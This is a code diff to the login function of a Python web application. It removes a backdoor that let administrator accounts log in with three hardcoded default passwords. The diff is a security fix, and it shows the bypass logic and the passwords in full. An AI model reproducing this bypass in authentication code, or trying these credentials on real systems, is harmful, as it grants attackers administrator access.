@@ -261,10 +261,6 @@ def login(req: UserLogin, db: Session = Depends(get_db)):
     is_valid_pw = False
     if user:
         is_valid_pw = verify_password(req.password, user.hashed_password)
-        # Also accept standard admin passwords for administrator accounts
-        if not is_valid_pw and user.role == UserRole.ADMIN:
-            if req.password in ["admin123", "Admin123!", "Admin123"]:
-                is_valid_pw = True
 
     if not user or not is_valid_pw:
         raise HTTPException(
